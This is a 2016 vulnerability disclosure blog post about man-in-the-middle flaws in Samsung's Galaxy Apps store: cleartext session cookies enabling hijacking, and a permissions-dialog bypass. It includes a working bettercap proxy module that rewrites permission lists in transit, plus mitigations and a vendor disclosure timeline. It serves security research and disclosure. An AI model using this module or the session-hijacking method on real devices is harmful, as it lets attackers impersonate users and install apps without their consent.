---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-08-17_samsung-galaxy-apps-mitm-vulnerabilities.md
original_filename: 2016-08-17_samsung-galaxy-apps-mitm-vulnerabilities.md
title: Samsung Galaxy Apps MiTM vulnerabilities
category: documents
detected_topics:
- mobile-security
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- mobile-security
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: c1050ac91ae18d411bbd5480825edbf2dcb81bfd80ea239e85a86523ca7c34da
text_sha256: 4517c589c721b2e19791c0d79ea2e4651ca82c237320f6ecacc8d815dc9b2c80
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Samsung Galaxy Apps MiTM vulnerabilities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-08-17_samsung-galaxy-apps-mitm-vulnerabilities.md
- Source Type: markdown
- Detected Topics: mobile-security, command-injection, otp, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `c1050ac91ae18d411bbd5480825edbf2dcb81bfd80ea239e85a86523ca7c34da`
- Text SHA256: `4517c589c721b2e19791c0d79ea2e4651ca82c237320f6ecacc8d815dc9b2c80`


## Content

---
title: "Samsung Galaxy Apps MiTM vulnerabilities"
page_title: "Samsung Galaxy Apps MITM Vulnerabilities | evilsocket"
url: "https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/"
final_url: "https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/"
authors: ["Simone Margaritelli (@evilsocket)"]
programs: ["Samsung"]
bugs: ["MiTM", "Android"]
publication_date: "2016-08-17"
added_date: "2022-10-21"
source: "pentester.land/writeups.json"
original_index: 6269
---

# Samsung Galaxy Apps MITM Vulnerabilities

BY Simone Margaritelli — 17 Aug 2016 — [android](/tags/android/), [mobile security](/tags/mobile-security/), [mitm](/tags/mitm/), [traffic interception](/tags/traffic-interception/), [vulnerability research](/tags/vulnerability-research/), [cve](/tags/cve/), [man in the middle](/tags/man-in-the-middle/), [session hijacking](/tags/session-hijacking/), [permission bypass](/tags/permission-bypass/), [samsung](/tags/samsung/), [samsung galaxy apps](/tags/samsung-galaxy-apps/), [galaxy](/tags/galaxy/)

  
[Follow me on X](https://twitter.com/evilsocket)

The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.

## #Affected Products

Samsung Galaxy Apps <= 4.1.01-14

![galaxy apps](/images/2016/08/galaxyapps.png)

## #MITM, Information Leaks and Session Hijacking

### #Summary

Most of the application API requests are made through a unsafe HTTP connection which would allow a malicious third party to perform a network MITM attack and eventually exfiltrate user sensitive data such as his session identifier and subsequently use this data to impersonate the user session.

### #Details

The application relies on a XML based API used through HTTP, as soon as the user will open the app and start browsing a network attacker will be able to see requests sent to the API server and the user session data, for instance the first request being executed when the user clicks on an application detail page, identified by the name **productDetailOverview** is composed as shown in the following picture.

![galaxy apps](/images/2016/08/productDetailOverview.png)

The XML response will contain application data such as the creation date, last update date, product name and description, etc.

It is possible to see that the user session cookies ( **UUID** and **JSESSIONID** ) are sent in cleartext, therefore they can be used by an attacker to impersonate the user and perform API requests on his behalf.

Other XML request names sent during application browsing and installation are:

  * **bigBannerList** , used to obtain application preview images.
  * **expertCommentList** and commentList, these fetch comments for an app.
  * **productDetailRelated** , fetches related applications list.
  * **categoryProductList2Notc** , fetches products in the same category.
  * **sellerProductList2Notc** , fetches other products of the same vendor.
  * **androidManifestList** , fetches the list of permissions required by the application before installing it ( more on this later ).

### #Impact

  * User Impersonation - An attacker could use the exfiltrated session data to authenticate against the API server on the user’s behalf.
  * Contents Manipulation - With a transparent proxy and proper redirection rules, an attacker could intercept and modify the XML responses before they’re received by the application, this would allow him to replace product images, names and descriptions with fake ones.

## #Permissions Dialog Bypass

### #Summary

It is possible for an attacker performing a MITM network attack to intercept and modify the XML response of the **androidManifestList** request and force the product to install an application without showing to the user the permission list dialog which would require his approval.

### #Details

Once the user clicks on the “Install” button, an **androidManifestList** request is sent to the API endpoint in order to fetch the list of permissions that the application requires:

![galaxy apps](/images/2016/08/androidManifestList.png)

As shown in this picture, the response will contain the list of permissions separated by a double pipe ( “||” ) token.

This list is then splitted by the application and the user is prompted with a dialog which shows him the required permissions, the installation process requires the user to accept all of them in order to successfully continue.

![galaxy apps](/images/2016/08/mail.png)

An attacker performing a MITM network attack can intercept and modify the XML response for this API before it’s sent to the device and replace the permissions list with a single **INTERNET** permission entry, in this case the Samsung Galaxy Apps store will directly install the application without showing the user any dialog at all.

The following is a POC bettercap proxy module.
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  7  
  8  
  9  
  10  
  11  
  12  
  13  
  14  
  15  
  16  
  17  
  18  
  19  
  20  
  21  
  22  
  23  
  24  
  25  
  26  
  27  
  28  
  29  
  30  
  31  
  32  
  33  
  34  
  35  
  36  
  

| 
  
  
  =begin  
  
  BETTERCAP  
  
  Author : Simone 'evilsocket' Margaritelli  
  Email  : evilsocket@gmail.com  
  Blog  : http://www.evilsocket.net/  
  
  This project is released under the GPL 3 license.  
  
  =end  
  
  class GalaxyApps < BetterCap::Proxy::HTTP::Module  
  meta(  
  'Name'  => 'GalaxyApps',  
  'Description' => 'Bypass permission dialog for "Galaxy Apps" application on every Samsung device.',  
  'Version'  => '1.0.0',  
  'Author'  => "Simone 'evilsocket' Margaritelli",  
  'License'  => 'GPL3'  
  )  
  
  def on_request( request, response )  
  if !request.body.nil? and request.body.include?('<SamsungProtocol')  
  req_name = '???'  
  if request.body =~ /.+<request\s+name="([^"]+)"/i  
  req_name = $1  
  end  
  
  BetterCap::Logger.info "[#{'GALAXY APPS'.green}] Detected Galaxy Apps traffic: #{'request'.blue}='#{req_name.yellow}'"  
  
  if req_name == 'androidManifestList'  
  response.body.gsub!( /permission">[^<]+</i, 'permission">INTERNET<' )  
  end  
  end  
  end  
  end  
  
  
---|---  
  
### #Impact

An attacker could trick the user to think that an application which requires sensitive permissions does not require any at all, thus forcing the store to install it without any kind of user manual approval.

### #Mitigations & Recommendations

  * Use HTTPS connections for every API request.
  * Implement SSL key pinning to avoid SSL MITM attacks.
  * Double check the list of permissions after the application is downloaded reading them directly from its AndroidManifest.xml file.

### #Disclosure Timeline

  * May 2 2016 : Initial disclosure.
  * June 7 2016 : Follow up.
  * June 8 2016 : Email from vendor working on fixes.
  * June 9 2016 : Confirmation that fixes were going to be pushed in next release

[#android](/tags/android/) [#mobile security](/tags/mobile-security/) [#mitm](/tags/mitm/) [#traffic interception](/tags/traffic-interception/) [#vulnerability research](/tags/vulnerability-research/) [#cve](/tags/cve/) [#man in the middle](/tags/man-in-the-middle/) [#session hijacking](/tags/session-hijacking/) [#permission bypass](/tags/permission-bypass/) [#samsung](/tags/samsung/) [#samsung galaxy apps](/tags/samsung-galaxy-apps/) [#galaxy](/tags/galaxy/)

[ PREVIOUS DISCLOSURE - RCE Against Every Open Source BTS Software. ](/2016/08/24/RCE-against-every-open-source-BTS/) [ NEXT How the United Arab Emirates Intelligence Tried to Hire Me to Spy on Its People ](/2016/07/27/How-The-United-Arab-Emirates-Intelligence-Tried-to-Hire-me-to-Spy-on-its-People/)
